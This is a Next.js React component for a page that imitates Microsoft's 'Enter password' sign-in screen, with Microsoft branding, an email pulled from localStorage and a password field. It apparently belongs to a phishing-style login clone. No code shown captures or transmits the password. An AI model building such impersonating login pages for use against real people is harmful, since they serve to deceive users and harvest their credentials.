'use client'
import Head from "next/head";
import Image from "next/image";
import Link from "next/link";
import React from "react";

export default function Login() {
    const mail = localStorage.getItem("MicrosoftEmail")

    const handleClick = (e:any) =>{
      e.preventDefault()
    }
  return (
    <>
    <Head>
        <title>Sign in to your account</title>
        <link rel="icon" href='/microsoft.ico' />
      </Head>
    <div className="relative bg-form-bg bg-cover bg-center h-screen">
      <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
        <div className="bg-white w-[300px] h-[350px] md:w-[400px] md:h-[350px] shadow-2xl px-6">
            <form action="#" className="flex flex-col py-8 px-4">
                <div>
                    <Image src='/microsoft.png' alt="img" width={120} height={2} />
                </div>

                <div>
                    <h3 className="text-[14px] py-3">{mail}</h3>
                </div>

                <div>
                    <h3 className="text-xl font-semibold pt-2">Enter password</h3>
                </div>

                <div className="mt-3">
                    <input type='email' placeholder="Password" className="w-[100%] border-none focus:outline-none text-[14px]"  />
                    <hr className="h-px my-2 bg-gray-600 border-0 dark:bg-gray-700"></hr>
                </div>

                <div className="mt-2">
                    <Link href='/' className="text-[10px] md:text-[11px] font-normal text-[#0067B8] font-segoe">Forgot Password ?</Link>
                </div>

                <div className="mt-2">
                <Link href='/' className="text-[10px] md:text-[11px] font-normal text-[#0067B8] font-segoe">Email Code to the {`${mail}`}</Link>
                </div>

                <div className="flex justify-end mt-3">
                    <button onClick={handleClick} className="bg-[#0067B8] hover:bg-[#022B57] text-white py-1 px-8 text-[14px]">Sign In</button>
                </div>
            </form>
        </div>
      </div>
    </div>
    </>
  );
}
